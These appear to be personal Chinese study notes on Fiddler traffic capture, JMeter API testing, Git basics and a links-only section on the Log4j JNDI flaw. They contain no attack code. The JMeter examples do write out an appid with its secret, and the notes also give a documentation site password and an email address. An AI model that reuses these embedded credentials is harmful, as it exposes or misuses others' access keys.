> ![image-20211227205539188](Akio's Book.assets/image-20211227205539188.png)
>
> 然后就算请求其他网页也不会抓取出来，只会在访问上述链接的时候抓包
>
> ![image-20211227205719937](Akio's Book.assets/image-20211227205719937.png)
>
> 
>
> 
>
> 

> ![image-20211227204719479](Akio's Book.assets/image-20211227204719479.png)
>
> 黑色框中可以输入命令操作；Capturing的地方可以点击，点击成空白表示不走代理；All Processes的地方显示当前正在捕捉的是哪些进程
>
> https://docs.telerik.com/fiddler/knowledge-base/quickexec   命令文档



### 4、Fiddler抓取https协议的包

> Fiddler默认是抓取不了https的包的，因为https请求都是加密，需要证书生成双钥进行解密。接下来我们通过配置让Fiddler可以抓取https的包，工具栏点击Tools>Options，选中下面红框中的内容，就自动弹出证书的安装，安装完成后，就可以抓取https请求的包。如果没反应也可以点击右侧的Actions进行手动安装证书。
>
> ![image-20211228092817689](Akio's Book.assets/image-20211228092817689.png)
>
> ![image-20211228092603299](Akio's Book.assets/image-20211228092603299.png)



### 5、如何抓取安卓的包

> 以上演示的所有抓包都是在PC端的浏览器上的，那么对于安卓的请求，我们如何抓包呢？
>
> 同样，我们也需要设置上一节的https请求的允许。同时也要勾选如下选项
>
> <img src="Akio's Book.assets/image-20211228093327587.png" alt="image-20211228093327587" style="zoom:60%;" />
>
> 完成上面两项之后，我们还要确保使用Fiddler的电脑和手机（或模拟器）在同一网段
>
> 一般的做法是两者连接同一WIFI。
>
> 完成上述三项之后，我们还需要给我们的手机设置代理，因为Fiddler在PC端打开的时候，是默认给浏览器增加代理。但对于手机，我们只能手动的去添加代理。https://www.bilibili.com/video/BV19b4y1t79V?p=23
>
> 这里的手动代理需要填写的是安装fiddler的主机的IP地址和端口8888
>
> ![image-20211228143440804](Akio's Book.assets/image-20211228143440804.png)![image-20211228143452991](Akio's Book.assets/image-20211228143452991.png)
>
> 此时还没有完成，我们需要给手机安装Fiddler证书。在手机浏览器上访问Fiddler的地址，可以得到如下图的内容，点击下图红框中，安装证书。然后我们的Fiddler就可以抓到我们手机上的数据
>
> ![image-20211228143702195](Akio's Book.assets/image-20211228143702195.png)
>
> ![image-20211228143905056](Akio's Book.assets/image-20211228143905056.png)
>
> ---
>
> ![image-20211228144336753](Akio's Book.assets/image-20211228144336753.png)



## Jmeter

https://www.bilibili.com/video/BV19b4y1t79V?from=search&seid=15660672082553331946&spm_id_from=333.337.0.0

https://www.processon.com/view/link/60093eeb1e0853406be862f4#map	python自动化测试

---

http://47.107.116.139/showdoc/web/?#/3?page_id=51 Jmeter教程网站 登入密码msxy

---

对Jmeter，Postman一些基本我都会。但是如何真实的在项目中去实施呢？ 

### 一、接口测试分类 

> 内部接口：测试被测系统各个子模块之间的接口，或者被测系统提供给内部系统使用的接口。
>
>  外部接口： 
> 		1.被测系统调用外部的接口。 
> 		2.系统对外提供的接口。
>
>  接口测试重点：检查接口参数传递的正确性，接口功能的正确性，输出结果的正确性，以及对各种异常情况的容错处理，以及权限控制， 分页，调用次数的限制。

### 二、目前接口架构设计

> 1.基于SOAP架构。基于XML规范。基于WebSerice协议。特点：接口地址?wsdl结尾。
>
> 2.基于RPC架构，基于dubbo协议，thrift协议。SpringCloud微服务。 
>
> 3.基于RestFul架构，基于json规范。基于http协议。 
>
> ​			RestFul规则： 接口地址：http://127.0.0.1/user
> ​			get(查询用户)，post（新增用户）, put(修改用户), delete（删除用户） 
>
> ​			Json数据格式：只有两种数据类型。 键值对：{key：value} 数组：[arry1,arry2]

> 既然谈到了http协议
>
> ![image-20211223210459554](Akio's Book.assets/image-20211223210459554.png)
>
> ![image-20211223210528468](Akio's Book.assets/image-20211223210528468.png)
>
> 我们可以使用抓包工具获取一个请求的具体数据，工具是Progress Telerik Fiddler Web Debugger



### 三、市面上的接口测试工具

Jmeter+Ant+Git+Jenkins 

Postman+Newman+Git+Jenkins

soapui，apipost, fildder，charles



### 四、Jmeter简介，安装，环境变量的配置。

基于Java语言压力测试工具，可以做接口测试，也可以做性能测试。 

安装：JDK1.8以上，配置JDK环境变量。



### 五、Jmeter目录介绍

![image-20211223211352767](Akio's Book.assets/image-20211223211352767.png)

> backups：脚本备份目录。格式JMX 
>
> bin目录：存放Jmeter的启动脚本，配置文件。模块文件。
> 		 jmeter.bat 启动Jmeter 
>  		jmeter.properties 核心配置文件。 
>
> docs：离线帮助文档。 
>
> extras：存放与第三方的集成构建文件。集成Ant,Jenkins。
>
> lib目录：存放jar包。 
>
> licensce:许可证文件。



### 六、Jmeter常用组件 

> 1.测试计划：起点。所有组件的容器。 
>
> 2.线程组：代表一定数量的用户。 
>
> 3.取样器：向服务器发送请求的最小单元。 
>
> 4.逻辑控制器：结合取样器实现一些复杂的逻辑。 
>
> 5.前置处理器：在请求之前的工作 
>
> 6.后置处理器：在请求之后的工作 
>
> 7.断言：用于判断请求是否成功。 
>
> 8.定时器：负责在请求之间的延迟间隔。如固定，高斯，随机 
>
> 9.配置元件：配置信息 
>
> 10.监听器：负责收集结果。
>
> 
>
> <font color=red><b>顺序：非常重要</b></font> 
>
> 测试计划》线程组》配置元件》前置处理器》定时器》取样器（请求）》后置处理器》断言》监听器。
>
> <font color=red><b>作用域：非常重要 </b></font>
>
> 必须组件(做测试必须要有)：测试计划，线程组，取样器 
>
> 辅助组件：除了必须组件外
>
> **<i>辅助组件作用于父组件，同级组件，以及同级组件下的所有子组件。</i>**
>
> 两个简单控制器中的查看结果树只能查看对应控制前的java请求1/2。而所属线程组的，同时与两个简单控制器同级的查看结果树可以收集所有的java请求（运行是运行整个测试计划），这一点证明了辅助组件作用于同级组件，以及同级组件下的所有子组件
>
> ![image-20211223212937166](Akio's Book.assets/image-20211223212937166.png)
>
> 以下是在java请求1下添加了一个查看结果树，运行测试计划，发现这个查看结果树也能收集到其父组件的结果，故此证明辅助组件作用于父组件
>
> ![image-20211223213311522](Akio's Book.assets/image-20211223213311522.png)



### 七、Jmeter执行接口测试 

> 1.拿到api接口文档（Fiddler），熟悉接口业务，接口地址，鉴权方式，入参，出参，错误码。 
>
> 2.编写接口测试用例。 
> 			<font color=red>测试思路：</font> 
> 			正例：输入正常入参，查看接口成功返回。 
> 			反例： 
> 					鉴权：空，错误，鉴权过期，鉴权次数限制........ 
> 					参数：空，类型错误，长度错误，错误码的覆盖。 
> 					其他：黑名单、分页。 
>
> 3.使用接口测试工具执行。 
>
> 4.Jmeter+Ant+Git+Jenkins实现持续集成输出接口测试报告。通过电子邮件发送。



### 八、接口测试实战

> [码尚学院API文档--ShowDoc](http://47.107.116.139/showdoc/web/?#/3?page_id=45)  密码是msxy，可以使用这个接口文档测试
>
> ![image-20211224110957240](Akio's Book.assets/image-20211224110957240.png)
>
> 10000，高峰期，10分中内1000个用户，1分钟100个用户。1秒=100/60=5/3
>
> 一般来说，做接口测试，这三个值都是1
>
> ![image-20211223214930387](Akio's Book.assets/image-20211223214930387.png)
>
> Http Cookie管理器，只有在第一次发送请求的时候，服务器会把cookie发送到客户端，以后的客户端对服务端的n次请求都会带上这个cookie。
>
> 加入不要动，他会自动管理
>
> ![image-20211223215506750](Akio's Book.assets/image-20211223215506750.png)
>
> 一般在请求的时候有协议，ip，端口，这些东西在项目中都是固定的
> 然后他们的路径和内容编码我们一般是不设定默认值的
>
> ![image-20211224103744207](Akio's Book.assets/image-20211224103744207.png)
>
> 然后添加一个“用户定义的变量”这个配置元件
>
> ![image-20211224104128930](Akio's Book.assets/image-20211224104128930.png)
>
> 注意：以上三个都是配置元件，然后我们就要添加一些取样器，这里加一个‘http请求’的取样器，名称叫做“1:获取接口统一鉴权码token接口”，为了获取鉴权码，以便后续操作
>
> ```json
> GET
> path：/cgi-bin/token
> prarms：
> grant_type=client_credential
> appid=wx6b11b3efd1cdc290&
> secret=106a9c6157c4db5f6029918738f9529d
> ```
>
> ![image-20211224105834374](Akio's Book.assets/image-20211224105834374.png)
>
> 上图也可以修改如下
>
> ![image-20211224111305261](Akio's Book.assets/image-20211224111305261.png)
>
> 然后配置一个查看结果树
>
> ![image-20211224110255498](Akio's Book.assets/image-20211224110255498.png)
>
> ![image-20211224111659197](Akio's Book.assets/image-20211224111659197.png)
>
> 然后再添加一个取样器“HTTP请求”，名称叫做“2:编辑标签接口”，此时需要将上一个取样器禁用掉然后再去执行，不然的话鉴权码再次生成，上一次的就没用了
>
> 这里的链接可以在[码尚学院API文档--ShowDoc](http://47.107.116.139/showdoc/web/?#/3?page_id=49)获取到，密码msxy
>
> ![image-20211224112007087](Akio's Book.assets/image-20211224112007087.png)
>
> 执行后
>
> ![image-20211224112707830](Akio's Book.assets/image-20211224112707830.png)



### 九、Jmeter接口关联

> 上一个接口的返回值是下一个接口的参数，像上一节中，我必须要禁用获取token的取样器来保证我编辑标签的取样器中的token不会被刷新，那么我可以将前者的结果作为参数传递给后者使用吗？
>
> **1.使用正则表达式实现接口关联（可以作用于任意值）** 
>
> ![image-20211224114936449](Akio's Book.assets/image-20211224114936449.png)
>
> 既然可以获取到我们需要的鉴权码，我们就可以在取样器”1:获取接口统一鉴权码token接口“下添加一个后置处理器中的正则表达式提取器
>
> ![image-20211224135735923](Akio's Book.assets/image-20211224135735923.png)
>
> 虽然配置了，但我们怎么看我们这个正则执行的结果呢，我们可以为这个线程组添加一个调试取样器
>
> ![image-20211224135905294](Akio's Book.assets/image-20211224135905294.png)
>
> 然后点击运行，我们查看结果树，就可以从这个调试取样器中看到对应的数据没有没被获取到
>
> ![image-20211224173704692](Akio's Book.assets/image-20211224173704692.png)
>
> 然后将路径中设置变量替换
>
> ![image-20211227104902675](Akio's Book.assets/image-20211227104902675.png)
>
> 执行测试计划，每次生成的access_token都能得到正确使用
>
> ![image-20211227105102775](Akio's Book.assets/image-20211227105102775.png)
>
> 如果是多个参数，使用正则表达式一样用
>
> ![image-20211227110159288](Akio's Book.assets/image-20211227110159288.png)

> **2、使用Jsonpath表达式实现接口关联(只能作用于返回值为json的值)**
>
> 从根目录开始找（绝对路径）：`$.expires_in`
>
> 从任意目录开始找（相对路径）：`$..expires_in`
>
> ![image-20211227112612488](Akio's Book.assets/image-20211227112612488.png)
>
> 我们可以添加一个JSON提取器
>
> ![image-20211227112923365](Akio's Book.assets/image-20211227112923365.png)
>
> 执行程序，发现也是可以提取到的。JSON提取器也可以提取多个，但一般来说只用提取一个就好了。而且这个只能用于返回是JSON格式的数据的提取。后面的使用也是和上面一样
>
> ![image-20211227112951179](Akio's Book.assets/image-20211227112951179.png)



### 十、实现接口业务闭环

> 对接口的测试无非是增，改，删，查。但是这个有些操作就会对程序数据做出添加。我们可以实现一个业务闭环，就可以避免程序中留下不应该存在的数据
>
> 我们通过<u>创建->修改->删除->查询</u> 实现这个闭环
>
> 添加创建标签的取样器
>
> ![image-20211227114733373](Akio's Book.assets/image-20211227114733373.png)
>
> 运行显示可能返回如下这样的乱码`  {"tag":{"id":134,"name":"???"}}`
>
> 我们可以找到Jmeter的所在目录，bin>jmeter.properties，找到default.encodeing，设置其为UTF-8
>
> ![image-20211227114934979](Akio's Book.assets/image-20211227114934979.png)
>
> ![image-20211227115147824](Akio's Book.assets/image-20211227115147824.png)
>
> 如果这个没有用，也可以直接再取样器中设置编码UTF-8
>
> ![image-20211227115253705](Akio's Book.assets/image-20211227115253705.png)
>
> 如果以上都没有用可以给【Http请求】添加后置处理器【Bean shell后置处理程序】，填充脚本为`prev.setDataEncoding("UTF-8");`
>
> ![image-20211230150349698](Akio's Book.assets/image-20211230150349698.png)
>
> ![image-20211230150422668](Akio's Book.assets/image-20211230150422668.png)



### 十一、Jmeter动态参数处理

> 当一个请求的参数我们已经使用过，再次执行该请求就会提示已经有这个数据，这个时候我们就需要动态参数来做调整。
>
> 我们可以使用Jmeter提供的Toole中来生成随机数
>
> ![image-20211227140605970](Akio's Book.assets/image-20211227140605970.png)
>
> ![image-20211227141028944](Akio's Book.assets/image-20211227141028944.png)
>
> 然后将表达式放入JSON
>
> ![image-20211227141324898](Akio's Book.assets/image-20211227141324898.png)
>
> 当然也可以生成随机字符串
>
> ![image-20211227141656609](Akio's Book.assets/image-20211227141656609.png)
>
> 总结：注意是双下划线
>
> ```json
> 随机数字：${__Random(100000,999999,random_int)}
> 随机字符串：${__RandomString(6,abcdefg1234567890hijklmn,random_str)}
> ```



### 十二、接口测试之文件上传

> ![image-20211227143312695](Akio's Book.assets/image-20211227143312695.png)
>
> ![image-20211227143539694](Akio's Book.assets/image-20211227143539694.png)
>
> 这个是默认通过HttpClient4来发送请求的，所以再文件上传的参数配置中，MIME类型不填写而转去使用选框中的是不行的。但是只要把请求改为java，就可以采用这种方式。如下
>
> ![image-20211227143851134](Akio's Book.assets/image-20211227143851134.png)
>
> ![image-20211227143929928](Akio's Book.assets/image-20211227143929928.png)
>
> 当然，这种情况下，文件名称可能就无法识别，就可以填写绝对路径



### 十三、Jmeter接口测试断言

> 断言包括：状态断言和业务断言 
>
> ![image-20211227144753192](Akio's Book.assets/image-20211227144753192.png)
>
> ![image-20211227144811849](Akio's Book.assets/image-20211227144811849.png)
>
> > ![image-20211227145048434](Akio's Book.assets/image-20211227145048434.png)
> >
> > 响应文本：返回的json数据
> > 响应代码：200，404 
> > 响应信息：OK 
> > 响应头：
> > 请求头 :
> > URL 
> > 文档（文本）：返回的json数据以文本的方式去判断 
> > 忽略状态：当有多个断言时，如果有一个断言失败了，另一个成功了，那么结果是成功。 请求数据。
> >
> > ![image-20211227144926512](Akio's Book.assets/image-20211227144926512.png)
> >
> > 字符串：响应内容包含需要匹配的字符串，大小写敏感，不支持正则 
> > 包括： 响应内容包含需要匹配的字符串，大小写敏感，支持正则 
> > 匹配：响应内容完全等于需要匹配的字符串，大小写敏感，支持正则 
> > 相等：响应内容完全等于需要匹配的字符串，大小写敏感，不支持正则
> >
> > ![image-20211227145059293](Akio's Book.assets/image-20211227145059293.png)
> >
> > 测试模式中添加的数据就是比较中的准确值，整个断言就相当于一个if判断，if(未知==access_token)，这里的就是access_token就是上图的待比较的值
>
> 有了断言之后，我们就不需要【调试取样器】来查看数据的具体取值，直接看断言的错误信息就好
>
> ![image-20211227145602322](Akio's Book.assets/image-20211227145602322.png)
>
> ![image-20211227145659318](Akio's Book.assets/image-20211227145659318.png)



### 十四、Jmeter接口测试调试方案

> 1.通过【查看结果树】里面的请求信息和响应信息。 
>
> 2.使用【调试取样器】 
>
> 3.Jmeter结合fiddler实现调试。
> 		是把fiddler作为代理， 在没有接口文档，只能通过抓包去获取接口信息的时候使用。之后所有的请求都会被fidder抓包捕获
> ![image-20211227150509226](Akio's Book.assets/image-20211227150509226.png)



### 十五、CSV参数化的处理

> 下图中，三个参数grant_type,appid,secret都对应着正确值，是正例，那么反例呢？党grant_type不存在的时候，会怎么样呢。但由于这个只能存放一个参数，一次请求就无法看到对应的多种正反例状态。所以我们可以用CSV数据驱动解决这个问题。
>
> ![image-20211227152326288](Akio's Book.assets/image-20211227152326288.png)
>
> 在【HTTP请求】1:获取接口统一鉴权码token接口中添加【CSV数据文件设置】
>
> 针对于这个，写了如下的data.csv，其中assert_str是断言字符串
>
> ```csv
> grant_type,appid,secret,assert_str
> client_credential,wx6b11b3efd1cdc290&,106a9c6157c4db5f6029918738f9529d,access_token
> ,wx6b11b3efd1cdc290&,106a9c6157c4db5f6029918738f9529d,40002
> client_credential,,106a9c6157c4db5f6029918738f9529d,41002
> client_credential,wx6b11b3efd1cdc290&,,41004
> ```
>
> ![image-20211227153529851](Akio's Book.assets/image-20211227153529851.png)
>
> 完成这一步之后，我们将所有数据变为全局变量
>
> ![image-20211227153707652](Akio's Book.assets/image-20211227153707652.png)
>
> 同时包括断言字符串
>
> ![image-20211227153807796](Akio's Book.assets/image-20211227153807796.png)
>
> 然后我们执行，因为我们添加了一个【循环组件】，将请求放到【循环组件】中（或者用线程组中的线程数也可以，但循环组件可以保证只有这个一个请求会执行4次），可以将请求循环4次，就可以覆盖csv中的四种情况
>
> ![image-20211227153919126](Akio's Book.assets/image-20211227153919126.png)



### 十六、必须带请求头的接口

> 一般的网页除了你要请求的数据之外，还会同时附上其他的请求参数，对于某些网页，这是必须的
>
> 比如百度：我输入的参数只有”B站“，后面那些参数就是必须要带的请求头
>
> ![image-20211227154444176](Akio's Book.assets/image-20211227154444176.png)
>
> 我们定义一个线程组做一下操作，发现得到的响应中只有简单3行，这就不正常。但其实这也是因为我们没有携带请求头造成的
>
> ![image-20211228145714843](Akio's Book.assets/image-20211228145714843.png)
>
> ![image-20211228145439431](Akio's Book.assets/image-20211228145439431.png)
>
> 如此一来，我们就可以打开Fiddler抓包，然后把对应的 请求头拿过来
>
> ![image-20211228150038443](Akio's Book.assets/image-20211228150038443.png)
>
> 然后添加一个元件【HTTP信息头管理器】，从剪贴板添加刚复制的All headers
>
> ![image-20211228150222644](Akio's Book.assets/image-20211228150222644.png)
>
> 然后执行，就可以看到所有正常数据都出现了
>
> ![image-20211228150326121](Akio's Book.assets/image-20211228150326121.png)



### 十七、接口文档录制操作

> 如果没有接口文档的情况下，那么怎么做更好，就可以使用Jmeter 的脚本录制的功能。
>
> 在测试计划上添加【非测试元件】HTTP代理服务器
>
> ![image-20211228151335715](Akio's Book.assets/image-20211228151335715.png)
>
> ![image-20211228151453869](Akio's Book.assets/image-20211228151453869.png)
>
> 然后设置本机请求，通过代理去发送
>
> ![image-20211228151847388](Akio's Book.assets/image-20211228151847388.png)
>
> 然后点击启动，访问你需要的网站接口，访问的信息就会记录下来
>
> ![image-20211228154323686](Akio's Book.assets/image-20211228154323686.png)
>
> ![image-20211228154353535](Akio's Book.assets/image-20211228154353535.png)
>
> 当然也可以使用其中的排除模式或包含模式，排除一些请求和包含特定请求，只是首尾要使用.*
>
> ![image-20211228154451162](Akio's Book.assets/image-20211228154451162.png)
>
> **注意：使用完录制功能后要把本机代理给关闭，不然的话，你所有的网站都不能访问了**



### 十八、Jmeter中的Bean Shell组件和语言规则

>  BeanShell是一种完全符合java语法规则的脚本语言，同时他还有自己的语法规则。 
>
>  Jmeter有哪些Bean Shell: 
>
> 1.前置处理器：Beanshell预处理程序。
>
> 2.定时器：BeanShell 
>
> 3.采样器：BeanShell 
>
> 4.后置处理器：BeanShell 
>
> 5.断言：BeanShell 
>
> 6.监听器：BeanShel



### 十九、Bean shell内置的变量和语法规则

> **1.log 打印日志**
>
> ```shell
> log.info("gooe job");
> 
> log.error("bad job"); 
> 
> System.out.println("控制台打印");//控制台打印的数据在开启Jmeter的cmd控制台上浮现
> ```
>
> ![image-20211228162252635](Akio's Book.assets/image-20211228162252635.png)
>
> 
>
> **2.vars表示：JmeterVariables，操作Jmeter变量，（只能在当前线程组使用）** 
>
> 1）用户定义的变量
>
> ![image-20211228164136096](Akio's Book.assets/image-20211228164136096.png)
>
> ![image-20211228164202816](Akio's Book.assets/image-20211228164202816.png)
>
> 2）正则表达式，JSON提取器。 
>
> ![image-20211228164247891](Akio's Book.assets/image-20211228164247891.png)
>
> ![image-20211228165403193](Akio's Book.assets/image-20211228165403193.png)
>
> 3）定义变量 
>
> ```shell
> vars.put("www","yyy");
> log.info(vars.get("www"));
> ```
>
> 注意：以上几种方式只能在同意线程组中访问到，不是同一线程组就需要参考下面的方案
>
> 
>
> **3.props用于存取Jmeter的全局静态变量。（可以跨线程组）**
>
> 在Jmeter安装目录下的jmeter.properties中的变量都是全局的。可以拿来测试
>
> ![image-20211228165918147](Akio's Book.assets/image-20211228165918147.png)
>
> 全局变量
>
> ```java
> props.put("x","yosdif");
> log.info(props.get("x"));
> ```
>
> 
>
> **4.prev 获取到前面一个取样器返回的信息。**
>
> ```java
> //获取前面取样器的值
> log.info(prev.getResponseCode());
> log.info(prev.getResponseDataAsString());
> ```
>
> 
>
> **5.ctx 上下文**
>
> ```java
> System.out.println(ctx.getProperties());
> ```
>
> ![image-20211228172522914](Akio's Book.assets/image-20211228172522914.png)



### 二十、Jmeter执行数据库操作

> 1.准备数据库的驱动Jar包。 
> 	mysql，oracle.... 
> 	![image-20211228175706675](Akio's Book.assets/image-20211228175706675.png)
>
> ​		方式一：在测试计划里面引用。 不过一般是用第二种
> ​		![image-20211228175751289](Akio's Book.assets/image-20211228175751289.png)
>
> ​		方式二：放到jmeter的lib目录。 
>
> ​		![image-20211228175920230](Akio's Book.assets/image-20211228175920230.png)
>
> 
>
> 2,新建一个：JDBC connnection configuration. 
>
> ![image-20211228203844667](Akio's Book.assets/image-20211228203844667.png)
>
> ![image-20211228204052335](Akio's Book.assets/image-20211228204052335.png)
>
> 3.新建一个：JDBC request
>
> ![image-20211228204431908](Akio's Book.assets/image-20211228204431908.png)
>
> 添加一个【察看结果树】，我们就可以查看到结果
>
> ![image-20211228204933365](Akio's Book.assets/image-20211228204933365.png)
>
> 此时，我有一个需求：提取第一行的用户名和电话。我就可以用上一节学习到的Bean shell来操作
>
> ![image-20211228205550473](Akio's Book.assets/image-20211228205550473.png)
>
> 可以打印出来，那么我也可以使用`vars.put`方法存放取到的值，然后在需要这些值的请求中使用它



### 二十一、Jmeter的非GUI方式运行

> 1、执行JMX文件的命令：jmeter
>
> 2、命令行参数：
> 		-n -t			-n非界面方式运行	-t指定jmx文件的位置
> 		-l                 -l指定生成的jtl格式的结果
> 		-e -o           -e生成HTML报告， -o指定HTML报告的文件夹（注意：这个文件夹必须是空目录）
>
> 示例：
>
> - 在存在.jmx文件夹下打开cmd窗口，执行`jmeter -n -t `
>
>   ![image-20211228210824237](Akio's Book.assets/image-20211228210824237.png)
>
> - 执行`jmeter -n -t "Test Plan.jmx" -l result.jtl`，可在目录下生成jtl文件，然后我们可以打开jmeter。使用一个【察看结果树】，打开这个文件
>
>   ![image-20211228210926432](Akio's Book.assets/image-20211228210926432.png)
>
>   ![image-20211228211204278](Akio's Book.assets/image-20211228211204278.png)
>
> - 执行`jmeter -n -t "Test Plan.jmx" -l result.jtl -e -o report`，注意：你要先把上面执行过的.jtl文件删掉，并且，这个目录下创建一个空文件夹report
>
>   <img src="Akio's Book.assets/image-20211228211550533.png" alt="image-20211228211550533" style="zoom:80%;" />
>
>   ![image-20211228211624676](Akio's Book.assets/image-20211228211624676.png)
>
>   



## Actuator生产监控







## Log4j漏洞-JNDI注入

https://www.bilibili.com/video/BV1wb4y1q7Ps?from=search&seid=6489645300758706395&spm_id_from=333.337.0.0

https://cert.360.cn/warning/detail?id=d5dd5bbdfbb3d58c3a633e4e105e22bb

https://mp.weixin.qq.com/s/67q5tabt9T04cQROI1jnkA

https://www.bilibili.com/video/BV1dZ4y197KJ?p=1

https://log4j2-detector.chaitin.cn/







## 全栈之巅

https://www.bilibili.com/video/BV18E41127N4?spm_id_from=333.999.0.0

https://www.bilibili.com/video/BV1A4411Y7fi?spm_id_from=333.999.0.0

https://www.bilibili.com/video/BV1S4411W79F?spm_id_from=333.999.0.0





## 生产回滚







## 服务器负载

https://blog.csdn.net/weixin_41485592/article/details/88639547





## CI/CD

持续集成/持续部署

https://www.bilibili.com/video/BV1zf4y127vu?from=search&seid=9182694068358631743&spm_id_from=333.337.0.0 devops

https://www.bilibili.com/video/BV1Si4y1G7vz?from=search&seid=13026966274522770779&spm_id_from=333.337.0.0





## 支付接入支付需要注意那些

https://blog.csdn.net/qq_40286444/article/details/105708004 	对接三方支付



## debug操作





## git

https://www.bilibili.com/video/BV1FE411P7B3?spm_id_from=333.999.0.0

https://mp.weixin.qq.com/s/Bf7uVhGiu47uOELjmC5uXQ

### 版本控制

### 什么是版本控制

版本控制（Revision control）是一种在开发的过程中用于管理我们对文件、目录或工程等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。

- 实现跨区域多人协同开发
- 追踪和记载一个或者多个文件的历史记录
- 组织和保护你的源代码和文档
- 统计工作量
- 并行开发、提高开发效率
- 跟踪记录整个软件的开发过程
- 减轻开发人员的负担，节省时间，同时降低人为错误

简单说就是用于管理多人协同开发项目的技术。

没有进行版本控制或者版本控制本身缺乏正确的流程管理，在软件开发过程中将会引入很多问题，如软件代码的一致性、软件内容的冗余、软件过程的事物性、软件开发过程中的并发性、软件源代码的安全性，以及软件的整合等问题。

无论是工作还是学习，或者是自己做笔记，都经历过这样一个阶段！我们就迫切需要一个版本控制工具！



### 常见的版本控制工具

我们学习的东西，一定是当下最流行的！

主流的版本控制器有如下这些：

- **Git**
- **SVN**（Subversion）
- **CVS**（Concurrent Versions System）
- **VSS**（Micorosoft Visual SourceSafe）
- **TFS**（Team Foundation Server）
- Visual Studio Online

版本控制产品非常的多（Perforce、Rational ClearCase、RCS（GNU Revision Control System）、Serena Dimention、SVK、BitKeeper、Monotone、Bazaar、Mercurial、SourceGear Vault），现在影响力最大且使用最广泛的是Git与SVN



### 版本控制分类

**1、本地版本控制**

记录文件每次的更新，可以对每个版本做一个快照，或是记录补丁文件，适合个人用，如RCS。

![image-20211215210505424](Akio's Book.assets/image-20211215210505424.png)

**2、集中版本控制  SVN**

所有的版本数据都保存在服务器上，协同开发者从服务器上同步更新或上传自己的修改

![image-20211215210523519](Akio's Book.assets/image-20211215210523519.png)

所有的版本数据都存在服务器上，用户的本地只有自己以前所同步的版本，如果不连网的话，用户就看不到历史版本，也无法切换版本验证问题，或在不同分支工作。而且，所有数据都保存在单一的服务器上，有很大的风险这个服务器会损坏，这样就会丢失所有的数据，当然可以定期备份。代表产品：SVN、CVS、VSS

**3、分布式版本控制 	Git**

每个人都拥有全部的代码！安全隐患！

所有版本信息仓库全部同步到本地的每个用户，这样就可以在本地查看所有版本历史，可以离线在本地提交，只需在连网时push到相应的服务器或其他用户那里。由于每个用户那里保存的都是所有的版本数据，只要有一个用户的设备没有问题就可以恢复所有的数据，但这增加了本地存储空间的占用。

但不会因为服务器损坏或者网络问题，造成不能工作的情况！

![图片](Akio's Book.assets/640.webp)



### Git与SVN的主要区别

SVN是集中式版本控制系统，版本库是集中放在中央服务器的，而工作的时候，用的都是自己的电脑，所以首先要从中央服务器得到最新的版本，然后工作，完成工作后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是必须联网才能工作，对网络带宽要求较高。

Git是分布式版本控制系统，没有中央服务器，每个人的电脑就是一个完整的版本库，工作的时候不需要联网了，因为版本都在自己电脑上。协同的方法是这样的：比如说自己在电脑上改了文件A，其他人也在电脑上改了文件A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。Git可以直接看到更新了哪些代码和文件！

**Git是目前世界上最先进的分布式版本控制系统。**



### Git配置

所有的配置文件，其实都保存在本地！

查看配置 git config -l

![image-20211215213454372](Akio's Book.assets/image-20211215213454372.png)

查看不同级别的配置文件：

```shell
#查看系统config
git config --system --list
　　
#查看当前用户（global）配置
git config --global  --list
```

**Git相关的配置文件：**

1）`Git\etc\gitconfig`  ：Git 安装目录下的 gitconfig   --system 系统级

2）`C:\Users\Administrator\ .gitconfig`   只适用于当前登录用户的配置  --global 全局

![image-20211215213950516](Akio's Book.assets/image-20211215213950516.png)

![image-20211215214019282](Akio's Book.assets/image-20211215214019282.png)

这里可以直接编辑配置文件，我们通过命令设置后会响应到这里。



### 设置用户名与邮箱（用户标识，必要）

当你安装Git后首先要做的事情是设置你的用户名称和e-mail地址。这是非常重要的，因为每次Git提交都会使用该信息。它被永远的嵌入到了你的提交中：

```shell
git config --global user.name "Akio"  #名称
git config --global user.email hao.shi3@dxc.com   #邮箱
```

只需要做一次这个设置，如果你传递了--global 选项，因为Git将总是会使用该信息来处理你在系统中所做的一切操作。如果你希望在一个特定的项目中使用不同的名称或e-mail地址，你可以在该项目中运行该命令而不要`--global`选项。总之--global为全局配置，不加为某个项目的特定配置。



### Git基本理论

#### 三个区域

Git本地有三个工作区域：工作目录（Working Directory）、暂存区(Stage/Index)、资源库(Repository或Git Directory)。如果在加上远程的git仓库(Remote Directory)就可以分为四个工作区域。文件在这四个区域之间的转换关系如下：

![image-20211215214521656](Akio's Book.assets/image-20211215214521656.png)

- Workspace：工作区，就是你平时存放项目代码的地方
- Index / Stage：暂存区，用于临时存放你的改动，事实上它只是一个文件，保存即将提交到文件列表信息
- Repository：仓库区（或本地仓库），就是安全存放数据的位置，这里面有你提交到所有版本的数据。其中HEAD指向最新放入仓库的版本
- Remote：远程仓库，托管代码的服务器，可以简单的认为是你项目组中的一台电脑用于远程数据交换

本地的三个区域确切的说应该是git仓库中HEAD指向的版本：

![image-20211215214909609](Akio's Book.assets/image-20211215214909609.png)

- Directory：使用Git管理的一个目录，也就是一个仓库，包含我们的工作空间和Git的管理空间。
- WorkSpace：需要通过Git进行版本控制的目录和文件，这些目录和文件组成了工作空间。
- .git：存放Git管理信息的目录，初始化仓库的时候自动创建。
- Index/Stage：暂存区，或者叫待提交更新区，在提交进入repo之前，我们可以把所有的更新放在暂存区。
- Local Repo：本地仓库，一个存放在本地的版本库；HEAD会只是当前的开发分支（branch）。
- Stash：隐藏，是一个工作状态保存栈，用于保存/恢复WorkSpace中的临时状态。



#### 工作流程

git的工作流程一般是这样的：

１、在工作目录中添加、修改文件；

２、将需要进行版本管理的文件放入暂存区域；

３、将暂存区域的文件提交到git仓库。

因此，git管理的文件有三种状态：已修改（modified）,已暂存（staged）,已提交(committed)

![image-20211215215531937](Akio's Book.assets/image-20211215215531937.png)



### Git项目搭建

#### 创建工作目录与常用指令

工作目录（WorkSpace)一般就是你希望Git帮助你管理的文件夹，可以是你项目的目录，也可以是一个空目录，建议不要有中文。

日常使用只要记住下图6个命令：

![image-20211215215944469](Akio's Book.assets/image-20211215215944469.png)



#### 本地仓库搭建

创建本地仓库的方法有两种：一种是创建全新的仓库，另一种是克隆远程仓库。

1、创建全新的仓库，需要用GIT管理的项目的根目录执行：

```shell
# 在当前目录新建一个Git代码库
$ git init
```

2、执行后可以看到，仅仅在项目目录多出了一个.git目录，关于版本等的所有信息都在这个目录里面。



#### 克隆远程仓库

